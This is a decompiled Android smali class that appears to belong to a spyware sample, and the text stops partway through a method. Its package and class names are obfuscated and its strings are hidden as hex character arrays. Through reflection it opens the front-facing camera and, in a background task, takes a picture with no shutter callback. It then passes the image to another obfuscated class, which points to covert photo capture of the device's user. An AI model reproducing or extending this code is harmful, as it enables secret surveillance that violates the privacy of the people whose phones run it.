.class Lkosp/ynqekv/swdt/Rsjny;
.super Landroid/os/AsyncTask;
.source "Rsjny.java"


# annotations
.annotation build Landroid/annotation/TargetApi;
    value = 0x9
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private cameras:Landroid/hardware/Camera;

.field private mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 51
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 52
    iput-object p1, p0, Lkosp/ynqekv/swdt/Rsjny;->mContext:Landroid/content/Context;

    .line 55
    return-void
.end method

.method private openFrontFacingCamera()Landroid/hardware/Camera;
    .locals 17

    .prologue
    .line 61
    const/4 v2, 0x0

    .line 66
    .local v2, "camera":Landroid/hardware/Camera;
    :try_start_0
    new-instance v13, Ljava/lang/String;

    const/16 v14, 0x17

    new-array v14, v14, [C

    fill-array-data v14, :array_0

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    invoke-static {v13}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    .line 67
    .local v3, "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const/4 v5, 0x0

    .line 68
    .local v5, "cameraInfo":Ljava/lang/Object;
    const/4 v10, 0x0

    .line 69
    .local v10, "field":Ljava/lang/reflect/Field;
    const/4 v4, 0x0

    .line 70
    .local v4, "cameraCount":I
    new-instance v13, Ljava/lang/String;

    const/16 v14, 0x12

    new-array v14, v14, [C

    fill-array-data v14, :array_1

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    const/4 v14, 0x0

    new-array v14, v14, [Ljava/lang/Class;

    invoke-virtual {v3, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v12

    .line 71
    .local v12, "getNumberOfCamerasMethod":Ljava/lang/reflect/Method;
    if-eqz v12, :cond_0

    .line 72
    const/4 v13, 0x0

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v13

    check-cast v13, Ljava/lang/Integer;

    invoke-virtual {v13}, Ljava/lang/Integer;->intValue()I

    move-result v4

    .line 74
    :cond_0
    new-instance v13, Ljava/lang/String;

    const/16 v14, 0x22

    new-array v14, v14, [C

    fill-array-data v14, :array_2

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    invoke-static {v13}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    .line 75
    .local v6, "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    if-eqz v6, :cond_1

    .line 76
    invoke-virtual {v6}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v5

    .line 78
    .end local v5    # "cameraInfo":Ljava/lang/Object;
    :cond_1
    if-eqz v5, :cond_2

    .line 79
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v13

    new-instance v14, Ljava/lang/String;

    const/4 v15, 0x6

    new-array v15, v15, [C

    fill-array-data v15, :array_3

    invoke-direct {v14, v15}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v13, v14}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v10

    .line 81
    :cond_2
    new-instance v13, Ljava/lang/String;

    const/16 v14, 0xd

    new-array v14, v14, [C

    fill-array-data v14, :array_4

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    const/4 v14, 0x2

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    sget-object v16, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v16, v14, v15

    const/4 v15, 0x1

    aput-object v6, v14, v15

    invoke-virtual {v3, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/NoSuchFieldException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_5
    .catch Ljava/lang/InstantiationException; {:try_start_0 .. :try_end_0} :catch_6
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_7

    move-result-object v11

    .line 82
    .local v11, "getCameraInfoMethod":Ljava/lang/reflect/Method;
    if-eqz v11, :cond_3

    if-eqz v6, :cond_3

    if-eqz v10, :cond_3

    .line 83
    const/4 v1, 0x0

    .local v1, "camIdx":I
    :goto_0
    if-lt v1, v4, :cond_5

    .line 108
    .end local v1    # "camIdx":I
    .end local v3    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v4    # "cameraCount":I
    .end local v6    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v10    # "field":Ljava/lang/reflect/Field;
    .end local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .end local v12    # "getNumberOfCamerasMethod":Ljava/lang/reflect/Method;
    :cond_3
    :goto_1
    if-nez v2, :cond_4

    .line 111
    :try_start_1
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_8

    move-result-object v2

    .line 117
    :cond_4
    :goto_2
    return-object v2

    .line 84
    .restart local v1    # "camIdx":I
    .restart local v3    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .restart local v4    # "cameraCount":I
    .restart local v6    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .restart local v10    # "field":Ljava/lang/reflect/Field;
    .restart local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .restart local v12    # "getNumberOfCamerasMethod":Ljava/lang/reflect/Method;
    :cond_5
    const/4 v13, 0x0

    const/4 v14, 0x2

    :try_start_2
    new-array v14, v14, [Ljava/lang/Object;

    const/4 v15, 0x0

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v16

    aput-object v16, v14, v15

    const/4 v15, 0x1

    aput-object v5, v14, v15

    invoke-virtual {v11, v13, v14}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 85
    invoke-virtual {v10, v5}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I
    :try_end_2
    .catch Ljava/lang/ClassNotFoundException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/NoSuchFieldException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_2 .. :try_end_2} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_2 .. :try_end_2} :catch_5
    .catch Ljava/lang/InstantiationException; {:try_start_2 .. :try_end_2} :catch_6
    .catch Ljava/lang/SecurityException; {:try_start_2 .. :try_end_2} :catch_7

    move-result v9

    .line 86
    .local v9, "facing":I
    const/4 v13, 0x1

    if-ne v9, v13, :cond_6

    .line 88
    :try_start_3
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x4

    new-array v14, v14, [C

    fill-array-data v14, :array_5

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    const/4 v14, 0x1

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    sget-object v16, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v16, v14, v15

    invoke-virtual {v3, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    .line 89
    .local v7, "cameraOpenMethod":Ljava/lang/reflect/Method;
    if-eqz v7, :cond_6

    .line 90
    const/4 v13, 0x0

    const/4 v14, 0x1

    new-array v14, v14, [Ljava/lang/Object;

    const/4 v15, 0x0

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v16

    aput-object v16, v14, v15

    invoke-virtual {v7, v13, v14}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v13

    move-object v0, v13

    check-cast v0, Landroid/hardware/Camera;

    move-object v2, v0
    :try_end_3
    .catch Ljava/lang/RuntimeException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/NoSuchFieldException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_3 .. :try_end_3} :catch_5
    .catch Ljava/lang/InstantiationException; {:try_start_3 .. :try_end_3} :catch_6
    .catch Ljava/lang/SecurityException; {:try_start_3 .. :try_end_3} :catch_7

    .line 83
    .end local v7    # "cameraOpenMethod":Ljava/lang/reflect/Method;
    :cond_6
    :goto_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 92
    :catch_0
    move-exception v8

    .line 93
    .local v8, "e":Ljava/lang/RuntimeException;
    :try_start_4
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_6

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x17

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_7

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/RuntimeException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catch Ljava/lang/ClassNotFoundException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/NoSuchFieldException; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/lang/InstantiationException; {:try_start_4 .. :try_end_4} :catch_6
    .catch Ljava/lang/SecurityException; {:try_start_4 .. :try_end_4} :catch_7

    goto :goto_3

    .line 100
    .end local v1    # "camIdx":I
    .end local v3    # "cameraClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v4    # "cameraCount":I
    .end local v6    # "cameraInfoClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v8    # "e":Ljava/lang/RuntimeException;
    .end local v9    # "facing":I
    .end local v10    # "field":Ljava/lang/reflect/Field;
    .end local v11    # "getCameraInfoMethod":Ljava/lang/reflect/Method;
    .end local v12    # "getNumberOfCamerasMethod":Ljava/lang/reflect/Method;
    :catch_1
    move-exception v8

    .local v8, "e":Ljava/lang/ClassNotFoundException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_8

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x16

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_9

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/ClassNotFoundException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 101
    .end local v8    # "e":Ljava/lang/ClassNotFoundException;
    :catch_2
    move-exception v8

    .local v8, "e":Ljava/lang/NoSuchMethodException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_a

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x15

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_b

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/NoSuchMethodException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 102
    .end local v8    # "e":Ljava/lang/NoSuchMethodException;
    :catch_3
    move-exception v8

    .local v8, "e":Ljava/lang/NoSuchFieldException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_c

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x14

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_d

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/NoSuchFieldException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 103
    .end local v8    # "e":Ljava/lang/NoSuchFieldException;
    :catch_4
    move-exception v8

    .local v8, "e":Ljava/lang/IllegalAccessException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_e

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x16

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_f

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/IllegalAccessException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 104
    .end local v8    # "e":Ljava/lang/IllegalAccessException;
    :catch_5
    move-exception v8

    .local v8, "e":Ljava/lang/reflect/InvocationTargetException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_10

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x19

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_11

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/reflect/InvocationTargetException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 105
    .end local v8    # "e":Ljava/lang/reflect/InvocationTargetException;
    :catch_6
    move-exception v8

    .local v8, "e":Ljava/lang/InstantiationException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_12

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x16

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_13

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/InstantiationException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 106
    .end local v8    # "e":Ljava/lang/InstantiationException;
    :catch_7
    move-exception v8

    .local v8, "e":Ljava/lang/SecurityException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_14

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x11

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_15

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/SecurityException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 112
    .end local v8    # "e":Ljava/lang/SecurityException;
    :catch_8
    move-exception v8

    .line 113
    .local v8, "e":Ljava/lang/RuntimeException;
    new-instance v13, Ljava/lang/String;

    const/4 v14, 0x2

    new-array v14, v14, [C

    fill-array-data v14, :array_16

    invoke-direct {v13, v14}, Ljava/lang/String;-><init>([C)V

    new-instance v14, Ljava/lang/StringBuilder;

    new-instance v15, Ljava/lang/String;

    const/16 v16, 0x17

    move/from16 v0, v16

    new-array v0, v0, [C

    move-object/from16 v16, v0

    fill-array-data v16, :array_17

    invoke-direct/range {v15 .. v16}, Ljava/lang/String;-><init>([C)V

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/RuntimeException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-static {v13, v14}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_2

    .line 66
    nop

    :array_0
    .array-data 2
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x2es
        0x68s
        0x61s
        0x72s
        0x64s
        0x77s
        0x61s
        0x72s
        0x65s
        0x2es
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
    .end array-data

    .line 70
    nop

    :array_1
    .array-data 2
        0x67s
        0x65s
        0x74s
        0x4es
        0x75s
        0x6ds
        0x62s
        0x65s
        0x72s
        0x4fs
        0x66s
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
        0x73s
    .end array-data

    .line 74
    :array_2
    .array-data 2
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x2es
        0x68s
        0x61s
        0x72s
        0x64s
        0x77s
        0x61s
        0x72s
        0x65s
        0x2es
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
        0x24s
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
        0x49s
        0x6es
        0x66s
        0x6fs
    .end array-data

    .line 79
    :array_3
    .array-data 2
        0x66s
        0x61s
        0x63s
        0x69s
        0x6es
        0x67s
    .end array-data

    .line 81
    :array_4
    .array-data 2
        0x67s
        0x65s
        0x74s
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
        0x49s
        0x6es
        0x66s
        0x6fs
    .end array-data

    .line 88
    nop

    :array_5
    .array-data 2
        0x6fs
        0x70s
        0x65s
        0x6es
    .end array-data

    .line 93
    :array_6
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_7
    .array-data 2
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
        0x20s
        0x66s
        0x61s
        0x69s
        0x6cs
        0x65s
        0x64s
        0x20s
        0x74s
        0x6fs
        0x20s
        0x6fs
        0x70s
        0x65s
        0x6es
        0x3as
        0x20s
    .end array-data

    .line 100
    nop

    :array_8
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_9
    .array-data 2
        0x43s
        0x6cs
        0x61s
        0x73s
        0x73s
        0x4es
        0x6fs
        0x74s
        0x46s
        0x6fs
        0x75s
        0x6es
        0x64s
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 101
    :array_a
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_b
    .array-data 2
        0x4es
        0x6fs
        0x53s
        0x75s
        0x63s
        0x68s
        0x4ds
        0x65s
        0x74s
        0x68s
        0x6fs
        0x64s
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 102
    nop

    :array_c
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_d
    .array-data 2
        0x4es
        0x6fs
        0x53s
        0x75s
        0x63s
        0x68s
        0x46s
        0x69s
        0x65s
        0x6cs
        0x64s
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 103
    :array_e
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_f
    .array-data 2
        0x49s
        0x6cs
        0x6cs
        0x65s
        0x67s
        0x61s
        0x6cs
        0x41s
        0x63s
        0x63s
        0x65s
        0x73s
        0x73s
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 104
    :array_10
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_11
    .array-data 2
        0x49s
        0x6es
        0x76s
        0x6fs
        0x63s
        0x61s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x54s
        0x61s
        0x72s
        0x67s
        0x65s
        0x74s
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 105
    nop

    :array_12
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_13
    .array-data 2
        0x49s
        0x6es
        0x73s
        0x74s
        0x61s
        0x6es
        0x74s
        0x69s
        0x61s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 106
    :array_14
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_15
    .array-data 2
        0x53s
        0x65s
        0x63s
        0x75s
        0x72s
        0x69s
        0x74s
        0x79s
        0x45s
        0x78s
        0x63s
        0x65s
        0x70s
        0x74s
        0x69s
        0x6fs
        0x6es
    .end array-data

    .line 113
    nop

    :array_16
    .array-data 2
        0x6ds
        0x65s
    .end array-data

    :array_17
    .array-data 2
        0x43s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
        0x20s
        0x66s
        0x61s
        0x69s
        0x6cs
        0x65s
        0x64s
        0x20s
        0x74s
        0x6fs
        0x20s
        0x6fs
        0x70s
        0x65s
        0x6es
        0x3as
        0x20s
    .end array-data
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lkosp/ynqekv/swdt/Rsjny;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    const/4 v5, 0x0

    .line 125
    invoke-direct {p0}, Lkosp/ynqekv/swdt/Rsjny;->openFrontFacingCamera()Landroid/hardware/Camera;

    move-result-object v2

    iput-object v2, p0, Lkosp/ynqekv/swdt/Rsjny;->cameras:Landroid/hardware/Camera;

    .line 126
    iget-object v2, p0, Lkosp/ynqekv/swdt/Rsjny;->cameras:Landroid/hardware/Camera;

    if-eqz v2, :cond_0

    .line 128
    iget-object v2, p0, Lkosp/ynqekv/swdt/Rsjny;->cameras:Landroid/hardware/Camera;

    .line 129
    new-instance v3, Lkosp/ynqekv/swdt/Bjylgrmv;

    iget-object v4, p0, Lkosp/ynqekv/swdt/Rsjny;->mContext:Landroid/content/Context;

    invoke-direct {v3, v4}, Lkosp/ynqekv/swdt/Bjylgrmv;-><init>(Landroid/content/Context;)V

    .line 128
    invoke-virtual {v2, v5, v5, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 140
    :goto_0
    return-object v5

    .line 133
    :cond_0
    iget-object v2, p0, Lkosp/ynqekv/swdt/Rsjny;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

